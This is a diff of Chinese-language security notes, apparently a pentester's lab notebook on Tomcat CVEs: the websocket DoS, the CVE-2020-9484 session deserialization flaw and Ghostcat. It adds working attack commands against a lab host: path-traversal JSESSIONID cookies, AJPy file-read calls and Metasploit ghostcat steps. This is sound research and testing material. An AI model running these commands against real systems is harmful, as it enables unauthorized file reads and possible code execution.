@@ -124,37 +124,105 @@ because: "Beginning January 15, 2020, The Central Repository will no longer supp
 
 ## Tomcat
 
-### tomcat ghostcat Tomcat-Ajp
+### Tomcat websocket 拒绝服务漏洞利用代码披露（CVE-2020-13935） (SCA:ACSV-2020-111301)
+
+条件：
+
+1. 有ws功能，默认examples下面有
+2. 版本小于 8.5.57 9.0.37 10.0.0-M7 
+
+危害： 服务器CPU百分百
+
+https://github.com/RedTeamPentesting/CVE-2020-13935
+
+### Apache Tomcat Session 反序列化代码执行漏洞（CVE-2020-9484） (SCA:CVE-2020-9484)
+
+1. 版本小于： 8.5.55/8.5.63 9.0.35/9.0.43 10.0.2
+
+CVE-2021-25329 上一个没有处理完
+CVE-2020-9484
+
+https://github.com/masahiro331/CVE-2020-9484
+
+好像没有什么效果
+
+```bash
+curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
+curl 'http://192.168.56.130:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/123.txt'
+```
+
+https://github.com/masahiro331/CVE-2020-9484
+git clone https://github.com/masahiro331/CVE-2020-9484.git
+https://github.com/IdealDreamLast/CVE-2020-9484
+https://y4er.com/post/cve-2020-9484-tomcat-session-rce/
+https://www.freebuf.com/vuls/245232.html
+https://threedr3am.github.io/2020/06/12/CVE-2020-9484%20Tomcat-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/
+
+攻击者可以控制服务器上的文件名/文件内容；
+服务器上配置使用了PersistenceManager的FileStore；
+PersistenceManager配置了sessionAttributeValueClassNameFilter值为“NULL”或者其他宽松的过滤器，使得攻击者可以提供反序列化对象；
+攻击者知道FileStore使用的存储位置到可控文件的相对路径。
+
+### ghostcat Tomcat-AJP 文件读取与包含漏洞（CVE-2020-1938） (SCA:ACSV-2020-022001)
 
 AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。
 因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。
 
-https://github.com/hypn0s/AJPy
+条件：
 
-[POC](https://github.com/0nise/CVE-2020-1938)
+1. 打开8009，8.5.50前默认是打开8009的
+2. 版本小于 8.5.51 9.0.31
 
-[tenable Nessus: CVE-2020-1938: Ghostcat](https://zh-cn.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487?tns_redirect=true)
+[POC1](https://github.com/hypn0s/AJPy) 这个工具只针对这个CVE
+
+```bash
+wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/bin/apache-tomcat-8.5.50.tar.gz
+tar xzf *.gz
+python tomcat.py version 192.168.56.130
+```
+
+必须打开 8009才能直接使用，这个是直接获取的请求
+python tomcat.py read_file --webapp=examples /WEB-INF/web.xml 192.168.56.130
+
+不能获得
+python tomcat.py read_file --webapp=examples /tmp/123.txt 192.168.56.130
+
+这个好像拿到的和原文件不同
+python tomcat.py read_file --webapp=examples /jsp/sessions/carts.jsp 192.168.56.130
+cat ~/tomcat/apache-tomcat-8.5.50/webapps/examples/jsp/sessions/carts.jsp  
+
+如果没有账号和密码，这个也取不到
+python tomcat.py read_file --webapp=manager /WEB-INF/jsp/connectorTrustedCerts.jsp 192.168.56.130
+
+下面这个应该是拿不到的
+conf/tomcat-users.xml
+
+[一文详解Tomcat Ghostcat-AJP协议文件读取/文件包含漏洞CVE-2020-1938](https://zhuanlan.zhihu.com/p/137527937)
+
+成功
+```bash
+sudo msfconsole
+search tomcat
+use auxiliary/admin/http/tomcat_ghostcat
+SET RHOSTS 192.168.56.130
+SET RPORT 8009
+run
+```
 
 [Apache Tomcat - AJP 'Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143)
 
-xray 长亭科技 tomcat ghostcat 扫描
-https://www.chaitin.cn/zh/ghostcat
+[xray 长亭科技 tomcat ghostcat 扫描](https://www.chaitin.cn/zh/ghostcat)
 
-CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
-https://www.anquanke.com/post/id/199351
+[CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告](https://www.anquanke.com/post/id/199351)
 
-CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
-https://www.anquanke.com/post/id/199448
+[CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析](https://www.anquanke.com/post/id/199448)
 
-CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
-https://www.anquanke.com/post/id/199351
-
-CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
-https://www.anquanke.com/post/id/199448
-
-[Google Search XSS漏洞分析](https://www.anquanke.com/post/id/213422)
-sanitize
-
+```xml
+<Connector port="8080" protocol="HTTP/1.1"
+             connectionTimeout="20000"
+             redirectPort="8443" />
+<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
+```
 ### xstream
 
 [20201214 CVE-2020-26258/26259：XStream 反序列化漏洞通告](https://www.anquanke.com/post/id/225489)
